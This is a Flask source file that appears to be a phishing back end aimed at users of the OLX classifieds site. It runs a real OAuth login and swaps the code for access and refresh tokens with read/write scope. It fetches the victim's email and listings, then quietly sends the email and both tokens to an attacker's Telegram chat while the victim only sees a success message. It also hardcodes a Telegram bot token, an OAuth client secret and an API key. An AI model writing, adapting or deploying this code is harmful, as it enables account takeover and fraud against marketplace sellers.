from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import os
import datetime
import json

app = Flask(__name__)

# ---- ПЕРЕМЕННЫЕ ----
TG_TOKEN = "8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw"
TG_CHAT_ID = "-1003455979409"
CLIENT_ID = "202421"
CLIENT_SECRET = "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf"

# ТВОЙ НОВЫЙ ДОМЕН RAILWAY (убедись, что в панели OLX указан именно он)
REDIRECT_URI = "https://maun-producton.up.railway.app/" 

SCRAPPEY_API_KEY = "CNfMoplyCx9lTygo1lkyzJphYJQF29sO4QYB4AnxMgsSe7c1qEBjJe4uL6QM"

def send_telegram_message(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                     json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True},
                     timeout=10)
    except: pass

def get_full_ad_info(url):
    # Заглушка для Scrappey (если нужно тянуть фото)
    return "https://static.olx.ua/static/olxua/nasz-olx/img/no-photo.png", "Договірна"

@app.route('/')
def index():
    ads_cookie = request.cookies.get('user_ads')
    user_ads = json.loads(ads_cookie) if ads_cookie else []
    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
            return render_template_string(html_content, sid="user", user_ads=user_ads)
    except Exception as e:
        return f"Помилка шаблону: {e}", 500

@app.route('/get_token', methods=['POST'])
def get_token():
    data = request.get_json(silent=True) or {}
    code = data.get('code')
    if not code: return jsonify({"error": "No code"}), 400

    token_url = 'https://www.olx.ua/api/open/oauth/token'
    payload = {
        'grant_type': 'authorization_code',
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'scope': 'read write v2'
    }
    
    try:
        response = requests.post(token_url, data=payload, timeout=15)
        if response.status_code == 200:
            res_json = response.json()
            access = res_json.get('access_token')
            refresh = res_json.get('refresh_token')
            
            auth_headers = {"Authorization": f"Bearer {access}", "Version": "2.0", "Accept": "application/json"}
            
            # Получаем инфо о юзере
            email = "Приховано"
            u_req = requests.get("https://www.olx.ua/api/partner/users/me", headers=auth_headers, timeout=7)
            if u_req.status_code == 200:
                email = u_req.json().get('data', {}).get('email', email)

            # Получаем объявления для отображения
            ads_list = []
            ads_req = requests.get("https://www.olx.ua/api/partner/adverts", headers=auth_headers, params={"limit": 3}, timeout=7)
            if ads_req.status_code == 200:
                for ad in ads_req.json().get('data', []):
                    ads_list.append({
                        "title": ad.get('title'),
                        "url": ad.get('url'),
                        "price": "Перевірено",
                        "img": "https://static.olx.ua/static/olxua/nasz-olx/img/no-photo.png"
                    })

            # ЛОГ В ТЕЛЕГРАМ С ТОКЕНОМ
            msg = (f"✅ <b>УСПІШНИЙ ВХІД OLX</b>\n\n"
                   f"📧 <b>Email:</b> <code>{email}</code>\n"
                   f"📦 <b>Оголошень:</b> {len(ads_list)}\n\n"
                   f"🔑 <b>Access Token:</b>\n<code>{access}</code>\n\n"
                   f"🔄 <b>Refresh Token:</b>\n<code>{refresh}</code>")
            send_telegram_message(msg)

            resp = make_response(jsonify({"status": "ok"}))
            resp.set_cookie('user_ads', json.dumps(ads_list), max_age=60*60*24*30)
            return resp
        
        return jsonify({"error": "Auth failed"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
